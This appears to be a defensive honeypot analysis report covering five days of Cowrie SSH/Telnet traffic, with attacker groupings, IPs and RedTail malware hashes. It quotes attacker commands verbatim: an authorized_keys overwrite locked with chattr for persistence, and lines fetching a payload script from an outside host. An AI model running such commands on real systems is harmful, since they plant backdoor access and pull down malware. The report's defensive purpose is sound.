
# SSH and Telnet Honeypot Analysis

## Executive summary

A honeypot was deployed on a public VPS and left exposed to the internet for
five days in August 2026. A honeypot is a machine connected to the internet on
purpose, so that attacks against it can be recorded safely. It is not a real
server — it only pretends to be one, and it logs every action taken against it.

This report analyses traffic to a single service on that honeypot: **Cowrie**,
which impersonates SSH and Telnet. Those are the two normal ways to take remote
control of a Linux machine.

Cowrie recorded **50,345 sessions**.

Some of that traffic was not an attack. A small number of connections came from
a commercial scanning company that indexes the whole internet and sells the
results. Those addresses are identified and set aside below.

What remains splits into three groups that behaved in completely different ways:

- **One group tested the machine and left.** They ran commands designed to check
  whether they were talking to a real shell, saw answers a real shell would not
  give, and withdrew without installing anything.
- **One group did not test at all.** They logged in and deployed malware
  immediately — seven files, built for five different processor types.
- **One group only logged in.** They authenticated repeatedly and typed nothing.
  This is credential validation: confirming which username and password pairs
  work, so they can be used later.

The malware hashes are listed at the end.

---

## Volume

Cowrie recorded approximately **243,000 events** over the five-day window. An
event is a single logged action — a connection opening, a login attempt, a
command typed, a file uploaded.

| Metric | Count |
|---|---|
| Events | ~243,000 |
| Sessions | 50,345 |

Sessions by protocol:

| Protocol | Sessions |
|---|---|
| SSH | 46,552 |
| Telnet | 3,793 |
| **Total** | **50,345** |

---

## Traffic that was not an attack

The largest single source of events across the honeypot as a whole, grouped by
network operator, is **Modat B.V. (AS209334)**, a company registered in the
Netherlands that scans the internet and sells the results as commercial
intelligence. It generated 192,636 events across all services.

The addresses observed:

```
85.217.149.11    85.217.149.22    85.217.149.30    85.217.149.42
85.217.149.12    85.217.149.26    85.217.149.35
85.217.149.13    85.217.149.27    85.217.149.40
```

Almost none of that volume reached Cowrie. In the archived SSH and Telnet logs,
these addresses produced **4 sessions and 8 events** in total — one connection
open and one connection close each, from four of the ten addresses.

No credentials were offered. No commands were run. The sessions contain no
`cowrie.client.version` event, meaning the connections closed before an SSH
version exchange completed. This is a port-liveness check: open the socket,
confirm something is listening, disconnect.

Excluding it changes the Cowrie totals by a rounding error:

| | Sessions | Events |
|---|---|---|
| Recorded | 50,345 | ~243,000 |
| Commercial scanning (Modat) | 4 | 8 |
| **Attack traffic** | **50,341** | **~243,000** |

Every finding below is drawn from data that commercial scanning does not
meaningfully affect.

---

## Group 1 — Tested for a honeypot, then withdrew

Twelve addresses ran the same reconnaissance script across 32 sessions between
13 and 17 August.

```
193.32.162.15 / .34 / .84              AS47890  RO
92.118.39.14 / .49 / .50 / .71         AS47890  RO
2.57.122.209                           AS47890  RO
195.178.110.217 / .227 / .228 / .232   AS48090  BG
```

The script collects the processor type, CPU model, core count and uptime, and
searches for NVIDIA graphics cards. Alongside that inventory it probes how the
shell itself responds, which is where the honeypot gave itself away.

In one typical session (`7f563a2fe1bb`, from `193.32.162.15`, 17 August at
04:55):

- The script uses `||` fallback chains. On a real system the first `uname`
  command succeeds and the rest of the chain is skipped. Here **every fallback
  ran in turn**, 1 to 25 ms apart.
- `busybox uname` returned `Command not found`, so the script continued into its
  `/proc/version` and `/etc/os-release` branches instead of stopping.
- In `head -1 /proc/version | cut -d -f1`, the delimiter argument lost its space.
  A real shell does not do this.

The session lasted 7.0 seconds and produced 302 bytes of terminal output. They
had seen enough and disconnected.

Across 1,545 connection events from these twelve addresses, the number of files
uploaded was **zero**.

---

## Group 2 — Deployed malware immediately

```
130.12.180.51
77.90.185.20
```

These two addresses ran no checks whatsoever. They authenticated and delivered a
payload straight away: **seven distinct files, built for five processor types**,
pushed across sessions in 21 separate uploads.

A persistence step accompanied the deployment:

```
chattr -ia ~/.ssh/authorized_keys
echo "ssh-rsa AAAA... rsa-key-20230629" > ~/.ssh/authorized_keys
chattr +ai ~/.ssh/authorized_keys
```

Existing file attributes are cleared first, which removes any lock set by an
earlier attacker. Their own key is written in. The file is then marked immutable
and append-only, so it cannot be modified again without first running
`chattr -ia` — a trap for anyone attempting cleanup.

Payloads were retrieved from:

```
https://217.60.195.113/sh
scp dlr@217.60.195.113:sh
```

---

## Group 3 — Credential validation only

```
195.178.110.137
```

This address logged in **thirteen times and typed no commands at all**. It
authenticated, confirmed the credentials worked, and disconnected.

This is the reconnaissance stage of a two-stage operation: one party confirms
which username and password pairs are valid and records them, and a different
party uses that list later to do the actual damage. Nothing was installed and
nothing was read.

---

## Malware hashes (SHA-256)

Deployed by Group 2. Binaries are not included in this repository — hashes only.

| File | SHA-256 | Bytes |
|---|---|---|
| `clean.sh` | `3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892` | 1,157 |
| `setup.sh` | `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | 2,126 |
| `redtail.arm7` | `d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141` | 1,448,252 |
| `redtail.arm8` | `d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e` | 1,696,412 |
| `redtail.i686` | `8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70` | 1,838,060 |
| `redtail.riscv` | `3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39` | 1,759,768 |
| `redtail.x86_64` | `f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987` | 1,989,056 |

The two shell scripts are the staging and cleanup components. The five
`redtail.*` files are the same payload compiled for ARMv7, ARMv8, i686, RISC-V
and x86-64 — the attacker does not know what hardware they have landed on, so
they bring every build.

---

## Scope

One sensor, five days, passive collection only. Nothing was scanned, probed or
contacted from the honeypot side. All enrichment used passive sources: registry
records, Team Cymru DNS, and historical Shodan data.
